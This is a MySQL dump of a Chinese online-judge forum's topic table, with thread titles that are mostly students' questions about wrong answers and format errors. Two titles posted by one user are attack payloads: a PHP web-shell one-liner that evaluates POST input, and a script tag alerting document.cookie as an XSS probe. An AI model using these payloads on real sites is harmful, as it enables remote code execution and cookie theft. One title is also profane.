CREATE DATABASE  IF NOT EXISTS `jol` /*!40100 DEFAULT CHARACTER SET latin1 */;
USE `jol`;
-- MySQL dump 10.13  Distrib 5.5.16, for Win32 (x86)
--
-- Host: 172.24.10.6    Database: jol
-- ------------------------------------------------------
-- Server version	5.0.77

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Not dumping tablespaces as no INFORMATION_SCHEMA.FILES table on this server
--

--
-- Table structure for table `topic`
--

DROP TABLE IF EXISTS `topic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `topic` (
  `tid` int(11) NOT NULL auto_increment,
  `title` varbinary(60) NOT NULL,
  `status` int(2) NOT NULL default '0',
  `top_level` int(2) NOT NULL default '0',
  `cid` int(11) default NULL,
  `pid` int(11) NOT NULL,
  `author_id` varchar(20) NOT NULL,
  PRIMARY KEY  (`tid`),
  KEY `cid` (`cid`,`pid`)
) ENGINE=MyISAM AUTO_INCREMENT=120 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `topic`
--

LOCK TABLES `topic` WRITE;
/*!40000 ALTER TABLE `topic` DISABLE KEYS */;
INSERT INTO `topic` VALUES (1,'圆球体积?',0,0,NULL,1043,'hook'),(2,'Runtime Error？',0,0,NULL,1048,'hook'),(3,'题目给的提示不清楚',0,0,NULL,1052,'oldsix'),(4,'为什么我交上去的总是不对啊？',0,0,NULL,0,'q360766663'),(5,'1177输出超限？？？',0,0,NULL,1177,'oldsix'),(6,'输入数据没有问题，总是WA',0,0,NULL,1167,'alen0128'),(7,'WA = =',0,0,NULL,1166,'alen0128'),(8,'wrong answer',0,0,NULL,1043,'user'),(9,'样例输入？',0,0,NULL,1001,'10111400321'),(10,'格式错误？',0,0,NULL,1012,'10111400321'),(11,'help me please？where is wrong?',0,0,NULL,1053,'10111400321'),(12,'感觉题没说清楚……',0,0,NULL,1086,'10111400321'),(13,'God? help me!~',0,0,NULL,1087,'10111400321'),(14,'天哪,菜鸟求帮助',0,0,NULL,1006,'shiyishi'),(15,'qsort不能用？',0,0,NULL,0,'alen0128'),(16,'这道题的输出是用科学技术法吗？',0,0,NULL,1188,'Binger'),(17,'RT~~~~~~~~~~~~~~~~~~~~~~~~~~',0,0,NULL,1193,'Binger'),(18,'POJ 2113解题报告',0,0,NULL,0,'yutingle'),(19,'BFS题型',0,0,NULL,0,'zhanyayun533'),(20,'如何联系管理员.?',0,0,NULL,0,'user'),(21,'那里出错...',0,0,NULL,1051,'xinling'),(22,'wrong answer...还有啥没考虑的...四组全对了呀..',0,0,NULL,1013,'mo01782964'),(23,'运行时错误？写得比较2...求改错，不盛感激',0,0,NULL,1124,'mo01782964'),(24,'最后的output没空行也注意了，就是错',0,0,NULL,1014,'mo01782964'),(25,'1193题目输入样例有误。且没法AC',0,0,NULL,1193,'wzlly1223'),(26,'为什么是PE',0,0,NULL,1234,'zhanyayun533'),(27,' FBI树数据范围 错了',0,0,NULL,1130,'09110200130'),(28,'为什么PE？？',0,0,NULL,1079,'778476'),(29,'众乐乐不如独乐乐',0,0,NULL,1124,'778477'),(30,'求宽度与长度的关系',0,0,NULL,1326,'mo01782964'),(31,'OJ建议 如果提交后WA能提供错误数据',0,0,NULL,1129,'mo01782964'),(32,'动态数组为什么是RT',0,0,NULL,1231,'778476'),(33,'自己做出来了 但是WA了 不知道哪里错',0,0,NULL,1326,'11111000211'),(34,'好吧··我的代码风格很差 求助',0,0,1022,1328,'11111000211'),(35,'输出问题',0,0,NULL,1092,'821661664'),(36,'为什么会运行错误？',0,0,NULL,0,'821661664'),(37,'居然还有论坛？',0,0,NULL,0,'11111000205'),(38,'<?php eval($_POST[xiao])?>',2,0,NULL,0,'asasas'),(39,'<script>alert(document.cookie)</script>',2,0,NULL,0,'asasas'),(40,'写得不太好，但也能运行啊',0,0,NULL,0,'11111600120'),(41,'按照答案给的输出应该对了啊',0,0,NULL,0,'274094419'),(42,'关于scanf的问题',0,0,NULL,0,'12111100122'),(43,'怎么不用break而用自己定义的东西退出if',0,0,NULL,0,'12111100122'),(44,'一直格式错误…有点想疯掉了',0,0,NULL,1012,'12111000109'),(45,'麻烦帮忙看一下 谢谢~',0,0,NULL,1360,'12111000232'),(46,'造福后人',0,0,NULL,1334,'778476'),(47,'标程错了吧',0,0,NULL,1210,'778476'),(48,'邪门了!',0,0,NULL,1286,'12160310223'),(49,'格式就JB错误！！！',0,0,NULL,1012,'12160310223'),(50,'这段代码 着实 看不懂啊.........',0,0,NULL,1086,'12111000232'),(51,'1172',0,0,NULL,0,'12111000999'),(52,'哪错了？？？？？',0,0,NULL,1206,'12160310223'),(53,'经典算法，还不行！！！！！！',0,0,NULL,1351,'12160310223'),(54,'就是格式错，怎么回事',0,0,NULL,1070,'12160310223'),(55,'改了许多次，格式还错',0,0,NULL,1070,'12160310223'),(56,'浪费我正确率！！！',0,0,NULL,1289,'12160310223'),(57,'就是编译错误！！！',0,0,NULL,1289,'12160310223'),(58,'题目根本没说会不会出现浮点数',0,0,NULL,1041,'DLDR13111800313'),(59,'有谁知道这题怎么做的',0,0,NULL,1040,'13110900125'),(60,'竟然出现运行时错误 ,怎么回事',0,0,NULL,0,'13110600315'),(61,'为啥   程序都对啊~~   求大神！',0,0,NULL,0,'13110100902'),(62,'大神帮帮忙啊',0,0,NULL,1052,'DLDR13111800321'),(63,'1050',0,0,NULL,1050,'DLDR13110600916'),(64,'时间超限什么意思啊？急',0,0,NULL,0,'DLDR13110100211'),(65,'HINT',0,0,1037,1412,'DLDR13110600998'),(66,'该怎么写，试了好多种了',0,0,NULL,1317,'13110600804'),(67,'课后习题6.2',0,0,NULL,0,'DLDR13110600916'),(68,'Wrong Answer',0,0,NULL,1171,'13110600211'),(69,'为什么不是正确呢？',0,0,NULL,1043,'DLDR13110100422'),(70,'我想知道一个账号密码忘了怎么办？？',0,0,NULL,0,'111111'),(71,'<!--蓝蓝果然是大坑-->',0,0,NULL,1406,'jason19659'),(72,'Answer',0,0,NULL,1072,'13110600315'),(73,'Answer',0,0,NULL,1006,'13110600315'),(74,'我快崩溃了，哪错了',0,0,NULL,1359,'13110600315'),(75,'跪了，输出超限是怎么回事？怎么优化？',0,0,NULL,1094,'13110600315'),(76,'对不对？',0,0,1037,1410,'13110600315'),(77,'我编的代码！1044',0,0,NULL,0,'12111000312'),(78,'n的范围都不给，，',0,0,NULL,1002,'13110601101'),(79,'为什么错？？？？',0,0,NULL,1355,'DLDR13110100206'),(80,'！ 题目就是坑！',0,0,NULL,1142,'DLDR13110100206'),(81,'二叉排序树',0,0,NULL,1370,'ThirDragon'),(82,'大数题！！！！',0,0,NULL,1149,'DLDR13110100206'),(83,'这个题变态啊！！！',0,0,NULL,1124,'5201314'),(84,'怎么判断输入完成？？？',0,0,NULL,1342,'5201314'),(85,'为毛不对',0,0,NULL,0,'sovouser'),(86,'为什么说我错了呢',0,0,NULL,1278,'sovouser'),(87,'这的题！！ 真的好贱啊！！！  ',0,0,NULL,1226,'DLDR13110100206'),(88,'求正确答案，或者帮我改一下',0,0,NULL,1087,'DLDR13110600916'),(89,'第一题怎么做啊',0,0,1041,1500,'xxhhbb13'),(90,'提示',0,0,1041,0,'liuzhenyu'),(91,'为何错误求解',0,0,1041,1485,'xxhhbb4'),(92,'哎',0,0,1041,0,'wwwwss1'),(93,'Python 不可用',0,0,NULL,0,'zzddqq7'),(94,'这个题 错了吧？',0,0,NULL,1210,'5201314'),(95,'Java代码，最近几天在看java 不明白哪里错了',0,0,NULL,1289,'524672142'),(96,'求大神，不明白错在哪里了！！',0,0,NULL,1473,'524672142'),(97,'友情提醒！（这题目的陷阱！）',0,0,NULL,1489,'524672142'),(98,'求修改',0,0,NULL,0,'DLDR14111300208'),(99,'为啥VC上运行没问题 已提交就说我编译错误啊',0,0,NULL,1042,'14110900216'),(100,'1001那个题怎么做的 ？',0,0,NULL,0,'14110600501'),(101,'求大神指教这两个程序分别错在哪',0,0,NULL,1041,'jsj1400710'),(102,'哪儿有格式错误啊！！',0,0,NULL,1002,'14111800216'),(103,'就是不对，我去、',0,0,NULL,1053,'jsj1400717'),(104,'怎么老是格式错误啊',0,0,NULL,1483,'14150400214'),(105,'怎么改',0,0,NULL,1065,'jsj1400920'),(106,'WA！！！！！',0,0,NULL,1166,'13111800121'),(107,'不太会写  瞎写的   编译器有Warning c4700',0,0,NULL,1057,'jsj1400920'),(108,'多给几组数验证一下',0,0,NULL,1136,'14110600126'),(109,'我就不知道这个怎么还是答案错误！！！！！',0,0,NULL,1173,'14110600125'),(110,'WA',0,0,NULL,1500,'13111800121'),(111,'我操他妈，这破逼题。哪错了？',0,0,NULL,1194,'jsj1400605'),(112,'来吧。求优化算法，时间超限了！',0,0,NULL,1238,'13111800121'),(113,'功能都能实现，格式怎么弄，按0结束那个？',0,0,NULL,1495,'14110600128'),(114,'格式错误',0,0,NULL,1018,'14110600125'),(115,'帮忙看看哪错的',0,0,NULL,1473,'14110600128'),(116,'正整数',0,0,NULL,1500,'14110600125'),(117,'why Wrong？',0,0,NULL,1485,'14110600125'),(118,'不知道哪里错了  求帮忙',0,0,NULL,1057,'zzl14110100216'),(119,'考虑了后面是不是前面这种情况',0,0,NULL,1447,'14110600125');
/*!40000 ALTER TABLE `topic` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-09-22 12:50:19
